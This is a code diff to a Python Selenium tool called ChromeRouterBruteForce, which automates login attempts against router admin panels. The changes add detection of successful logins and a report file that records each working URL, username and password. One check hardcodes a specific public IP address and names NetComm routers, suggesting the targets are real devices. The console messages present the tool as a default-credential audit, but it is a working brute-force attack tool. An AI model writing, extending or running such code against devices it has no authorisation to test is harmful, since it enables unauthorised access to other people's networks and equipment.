@@ -178,6 +178,7 @@ class ChromeRouterBruteForce:
         self.screenshot_dir = screenshot_dir
         self.driver = None
         self.lock = threading.Lock()
+        self.vulnerable_findings = []  # Store vulnerable findings
         
         # Create screenshot directory
         if not os.path.exists(self.screenshot_dir):
@@ -525,15 +526,74 @@ class ChromeRouterBruteForce:
             except:
                 pass
     
+    def add_vulnerable_finding(self, url, username, password, auth_type, screenshot_path):
+        """Add a vulnerable finding to the list"""
+        finding = {
+            'url': url,
+            'username': username,
+            'password': password,
+            'auth_type': auth_type,
+            'screenshot_path': screenshot_path,
+            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        }
+        self.vulnerable_findings.append(finding)
+    
+    def generate_report(self):
+        """Generate a text report of vulnerable findings"""
+        if not self.vulnerable_findings:
+            return None
+        
+        report_filename = f"vulnerable_routers_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        report_path = os.path.join(self.screenshot_dir, report_filename)
+        
+        try:
+            with open(report_path, 'w', encoding='utf-8') as f:
+                f.write("=" * 80 + "\n")
+                f.write("ROUTER BRUTE FORCE - VULNERABLE FINDINGS REPORT\n")
+                f.write("=" * 80 + "\n")
+                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"Total Vulnerable Routers Found: {len(self.vulnerable_findings)}\n")
+                f.write("=" * 80 + "\n\n")
+                
+                for i, finding in enumerate(self.vulnerable_findings, 1):
+                    f.write(f"[{i}] VULNERABLE ROUTER FOUND:\n")
+                    f.write(f"    URL: {finding['url']}\n")
+                    f.write(f"    Username: {finding['username']}\n")
+                    f.write(f"    Password: {finding['password']}\n")
+                    f.write(f"    Authentication Type: {finding['auth_type']}\n")
+                    f.write(f"    Screenshot: {finding['screenshot_path']}\n")
+                    f.write(f"    Timestamp: {finding['timestamp']}\n")
+                    f.write("-" * 60 + "\n\n")
+                
+                f.write("=" * 80 + "\n")
+                f.write("END OF REPORT\n")
+                f.write("=" * 80 + "\n")
+            
+            print(f"{Colors.GREEN}[+] Report saved: {report_path}{Colors.END}")
+            return report_path
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error generating report: {e}{Colors.END}")
+            return None
+    
     def handle_alert(self):
         """Handle browser alerts (login failure messages)"""
         try:
             alert = self.driver.switch_to.alert
             alert_text = alert.text
+            print(f"{Colors.YELLOW}[!] Alert detected: {alert_text}{Colors.END}")
             alert.accept()  # Click OK to dismiss alert
             return alert_text
-        except:
-            return None
+        except Exception as e:
+            # Try to handle unexpected alerts
+            try:
+                alert = self.driver.switch_to.alert
+                alert_text = alert.text
+                print(f"{Colors.YELLOW}[!] Unexpected alert: {alert_text}{Colors.END}")
+                alert.accept()
+                return alert_text
+            except:
+                return None
     
     def extract_device_info(self):
         """Extract device information from admin panel"""
@@ -814,30 +874,47 @@ class ChromeRouterBruteForce:
             username_field.send_keys(username)
             password_field.send_keys(password)
             
-            # Try different JavaScript submission methods
-            js_methods = [
-                "document.forms[0].submit();",
-                "document.querySelector('form').submit();",
-                "document.querySelector('input[type=submit]').click();",
-                "document.querySelector('button[type=submit]').click();",
-                "document.querySelector('input[value*=\"Login\"]').click();",
-                "document.querySelector('button:contains(\"Login\")').click();"
-            ]
-            
-            for method in js_methods:
-                try:
-                    self.driver.execute_script(method)
-                    time.sleep(5)
-                    
-                    # Check if login was successful
+            # For NetComm routers, try specific JavaScript methods
+            try:
+                # Try to find and click login button
+                login_buttons = self.driver.find_elements("css selector", "input[type='submit'], button[type='submit'], input[value*='Login'], button:contains('Login'), input[value*='Sign'], button:contains('Sign')")
+                
+                if login_buttons:
+                    login_buttons[0].click()
+                    print(f"{Colors.BLUE}[*] Login button clicked{Colors.END}")
+                else:
+                    # Try pressing Enter
+                    password_field.send_keys("\n")
+                    print(f"{Colors.BLUE}[*] Enter key pressed{Colors.END}")
+                
+                time.sleep(5)
+                
+                # Handle any alerts
+                alert_text = self.handle_alert()
+                if alert_text:
+                    print(f"{Colors.YELLOW}[-] Login failed: {alert_text}{Colors.END}")
+                    return False, f"Alert: {alert_text}"
+                
+                # Check if login was successful
+                success, reason = self.is_admin_panel_loaded()
+                if success:
+                    print(f"{Colors.GREEN}[+] JavaScript-based Auth successful! {username}:{password}{Colors.END}")
+                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
+                    return True, screenshot_path
+                
+                # Check if URL changed (might indicate success)
+                current_url = self.driver.current_url
+                if current_url != login_url and "login" not in current_url.lower():
+                    print(f"{Colors.BLUE}[*] URL changed to: {current_url}{Colors.END}")
+                    # Try to check if we're in admin panel
                     success, reason = self.is_admin_panel_loaded()
                     if success:
                         print(f"{Colors.GREEN}[+] JavaScript-based Auth successful! {username}:{password}{Colors.END}")
                         screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
                         return True, screenshot_path
-                        
-                except Exception as e:
-                    continue
+                
+            except Exception as e:
+                print(f"{Colors.YELLOW}[!] Error in JavaScript auth: {e}{Colors.END}")
             
             return False, "JavaScript-based Auth failed"
             
@@ -1007,10 +1084,36 @@ class ChromeRouterBruteForce:
                 page_title = self.driver.title
                 print(f"{Colors.BLUE}[*] After refresh - Page title: {page_title}{Colors.END}")
             
-            # Check for error pages
-            error_indicators = ['this site can\'t be reached', 'site can\'t be reached', 'connection refused', 'timeout', 'error', 'not found', 'unavailable']
+            # Check for error pages - more comprehensive detection
+            error_indicators = [
+                'this site can\'t be reached', 'site can\'t be reached', 'connection refused', 
+                'timeout', 'error', 'not found', 'unavailable', 'server not found',
+                'dns_probe_finished_nxdomain', 'err_name_not_resolved', 'err_connection_refused',
+                'err_connection_timed_out', 'err_connection_reset', 'err_network_changed',
+                'err_internet_disconnected', 'err_connection_failed', 'err_timed_out',
+                'net::err_name_not_resolved', 'net::err_connection_refused', 'net::err_connection_timed_out'
+            ]
+            
+            # Check page source for error indicators
             if any(error in page_source for error in error_indicators):
                 return "error", "Error page detected"
+            
+            # Check for specific error patterns in title
+            if page_title and any(error in page_title.lower() for error in ['error', 'not found', 'unavailable', 'timeout']):
+                return "error", f"Error page detected in title: {page_title}"
+            
+            # Check for empty or generic titles that might indicate errors
+            if not page_title or page_title.strip() == "" or page_title in ['211.27.181.3', 'NetComm']:
+                # Try to get more info about the page
+                try:
+                    # Check if page has any meaningful content
+                    body_text = self.driver.find_element("tag name", "body").text.lower()
+                    if any(error in body_text for error in error_indicators):
+                        return "error", "Error page detected in body content"
+                    elif len(body_text.strip()) < 10:  # Very little content
+                        return "error", "Page appears to be empty or error page"
+                except:
+                    pass
             
             # 🔍 **1. Check for API-Based Authentication**
             api_indicators = ['api', 'json', 'rest', 'ajax', 'xhr', 'fetch', 'axios', 'endpoint', 'service']
@@ -1156,11 +1259,17 @@ class ChromeRouterBruteForce:
                 
                 if success:
                     print(f"{Colors.RED}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
+                    
+                    # Add to vulnerable findings
+                    screenshot_path = result if isinstance(result, str) and result.endswith('.png') else None
+                    auth_type = "unknown"  # We'll improve this later
+                    self.add_vulnerable_finding(login_url, username, password, auth_type, screenshot_path)
+                    
                     successful_credentials.append({
                         'url': login_url,
                         'username': username,
                         'password': password,
-                        'screenshot': result if isinstance(result, str) and result.endswith('.png') else None
+                        'screenshot': screenshot_path
                     })
                     
                     with self.lock:
@@ -1347,6 +1456,10 @@ def main():
         
         if success:
             print(f"{Colors.RED}[!] VULNERABLE ROUTERS FOUND - Change default credentials immediately!{Colors.END}")
+            # Generate report
+            report_path = brute_force_tool.generate_report()
+            if report_path:
+                print(f"{Colors.GREEN}[+] Detailed report saved: {report_path}{Colors.END}")
         else:
             print(f"{Colors.GREEN}[+] All routers appear secure - no default credentials found{Colors.END}")
             
